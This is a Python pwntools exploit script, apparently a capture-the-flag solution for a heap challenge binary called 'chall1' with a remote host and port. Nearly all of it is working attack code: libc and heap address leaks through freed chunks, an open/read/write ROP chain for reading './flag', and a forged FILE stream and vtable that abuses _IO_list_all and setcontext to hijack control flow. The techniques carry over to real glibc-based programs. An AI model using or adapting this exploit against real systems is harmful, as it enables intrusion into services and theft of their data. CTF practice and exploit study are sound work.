#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './chall1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('> ')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.send(con)

def dele(idx):
    eat()
    p.sendline('2')
    p.recvuntil('delete?\n')
    p.sendline(str(idx))

def edit(idx, con):
    eat()
    p.sendline('3')
    p.recvuntil('edit?\n')
    p.sendline(str(idx))
    p.recvuntil('content:\n')
    p.send(con)

def show(idx):
    eat()
    p.sendline('4')
    p.recvuntil('show?\n')
    p.sendline(str(idx))


add(0x1008, '\n') #* 0
add(0x1008, b'./flag'.ljust(0x1008,b'\x00')) #* 1
add(0x1008, '\n') #* 2
add(0x1008, '\n') #* 3


dele(0)
dele(2)


show(0)
p.recvuntil('content:\n')
libc.address = u64(p.recv(6).ljust(8, b"\x00"))-0x3c4b78
log.success("libc.address: "+hex(libc.address))
mprotect_addr = libc.symbols['mprotect']
log.success('mprotect_addr: ' + hex(mprotect_addr))
setcontext_addr = libc.symbols['setcontext']
log.success('setcontext_addr: ' + hex(setcontext_addr))
_IO_list_all = libc.symbols['_IO_list_all']
log.success("_IO_list_all: "+hex(_IO_list_all))

show(2)
p.recvuntil('content:\n')
heapbase = u64(p.recv(6).ljust(8, b"\x00"))-0x540
log.success('heapbase: ' + hex(heapbase))


open_addr = libc.symbols['open'] #直接 call 的话 syscall 了 openat，就 kill 了
read_addr = libc.symbols['read']
write_addr = libc.symbols['write']
syscall_ret = 0xbc375 + libc.address
rdi_ret = 0x21102 + libc.address
rsi_ret = 0x202e8 + libc.address
rdx_ret = 0x1b92 + libc.address
rax_ret = 0x33544 + libc.address
# shellcode = asm(shellcraft.open("./flag", 0))
# shellcode += asm(shellcraft.read(3, heapbase + 0x10, 0x30))
# shellcode += asm(shellcraft.write(1, heapbase + 0x10, 0x30))


# debug()
flag_addr = heapbase+0x1560
payload = flat(
    0,0,rdi_ret,flag_addr,rsi_ret,0,rdx_ret,0,rax_ret,2,syscall_ret,
    rdi_ret,4,rsi_ret,heapbase+0x540,rdx_ret,0x100,rax_ret,0,syscall_ret,
    rdi_ret,1,rsi_ret,heapbase+0x540,rdx_ret,0x100,rax_ret,1,syscall_ret,
)
#* 0x3570+0x10
add(0x1008, payload) #* 4

add(0x418, '\n') #* 5




vtable_addr = heapbase+0x2a60
# _wide_data_ptr = heapbase+0x2a48



# stream = p64(0) + p64(0x61)
# stream += p64(0) + p64(_IO_list_all-0x10)# fd bk
# stream += b"\x00"*0x50
# stream += p64(0)+p64(0)#* rsi rdx
# stream = stream.ljust(0xa0,b"\x00")
# stream += p64(_wide_data_ptr)# _wide_data_ptr
# stream += p64(open_addr)
# stream = stream.ljust(0xc0,b"\x00")
# stream += p32(0)# mode

# payload = p32(0)
# payload += p64(0)
# payload += p64(0)# <-- _wide_data_ptr
# payload += p64(vtable_addr)
# payload += p64(0)# padding
# payload += p64(2)# fp->_wide_data->_IO_write_base
# payload += p64(3)# fp->_wide_data->_IO_write_ptr
# payload += p64(0)*3 # vtable [0] [1] [2]
# payload += p64(setcontext_addr + 53)# [3]

stream = p64(0) + p64(0x61)
stream += p64(0) + p64(_IO_list_all - 0x10)
stream += p64(0) + p64(1) #_IO_write_base < _IO_write_ptr
stream = stream.ljust(0x68,b"\x00")
stream += p64(0)#* chain rdi
stream += p64(0)#* rsi
stream += p64(0)#* rdx
stream = stream.ljust(0xa0,b"\x00")
stream += p64(0x550+0x10+heapbase)#* wide_data rsp
stream += p64(write_addr)#* rcx
stream = stream.ljust(0xc0,b'\x00') #bypass lots of things
stream += p32(0) #_mode<=0
stream += p32(0) + p64(0) * 2 #bypass _unused2

payload = b''
payload += p64(vtable_addr) #vtable_addr
payload += p64(0) * 3 #bypass three function ptr
payload += p64(setcontext_addr + 53)

edit(2, 0x410*b'a' + stream + payload)

debug()
eat()
p.sendline('1')
p.recvuntil('size:\n')
p.sendline(str(0x410))


p.interactive()
